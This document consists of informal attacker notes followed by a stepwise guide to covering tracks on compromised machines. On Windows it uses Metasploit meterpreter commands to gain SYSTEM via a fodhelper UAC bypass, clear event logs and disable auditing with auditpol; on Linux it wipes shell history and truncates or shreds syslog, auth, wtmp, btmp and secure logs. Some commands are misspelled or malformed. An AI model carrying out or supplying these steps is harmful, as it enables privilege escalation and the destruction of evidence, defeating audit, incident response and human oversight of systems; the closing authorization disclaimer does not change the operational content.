to check logs
=>  run event_manager -i 

to check id 
=> getuid

to athourity 
=> getsystem

if it not work
=> back
=> search uac
=> use exploit/windows/local/bypassuac_fodhelper
=> options
=> set SEASSION '
=> set SEASSION 1
=> run
=> getuid
=> getsystem
=> getuid

now after authorization

=> run event_manager -i
=> clearev

for stoping creating logs

1st we need nt athourity
now
=> execute -f cmd.exe -a "/c auditpol /clear"



so now in linux
=> cd /var /log/messages
else
=> cd /var/log
=> ls
=> kwrite messages

=> echo #HISTSIZE
=> export #HISTSIZE=0
=> history

=> shred -zu /root/.bash_history











Step 1: Clear Command History
- Remove the `.bash_history` file:
    ```bash
    rm ~/.bash_history
    ```
- Disable history logging for the current session:
    ```bash
    unset HISTFILE
    ```

Step 2: Clear Log Files
- Identify and clear system log files:
    ```bash
    sudo truncate -s 0 /var/log/syslog
    sudo truncate -s 0 /var/log/auth.log
    sudo truncate -s 0 /var/log/messages
    ```
- Use a secure deletion tool like `shred` if necessary:
    ```bash
    sudo shred -u /var/log/syslog
    ```

Step 3: Remove Temporary Files
- Clear temporary files:
    ```bash
    rm -rf /tmp/*
    ```

Step 4: Clear Shell History
- Overwrite and clear shell history:
    ```bash
    history -c
    history -w
    ```

Step 5: Remove Specific Files
- Identify and securely delete sensitive files:
    ```bash
    shred -u sensitive_file.txt
    ```

Step 6: Clear Network Logs
- Clear SSH logs:
    ```bash
    sudo truncate -s 0 /var/log/secure
    sudo truncate -s 0 /var/log/wtmp
    sudo truncate -s 0 /var/log/btmp
    ```

Step 7: Verify Cleanup
- Double-check that no traces remain:
    ```bash
    ls -la /var/log/
    history
    ```

Note: Always ensure you have proper authorization before performing any of these actions. Unauthorized activity may be illegal or unethical.
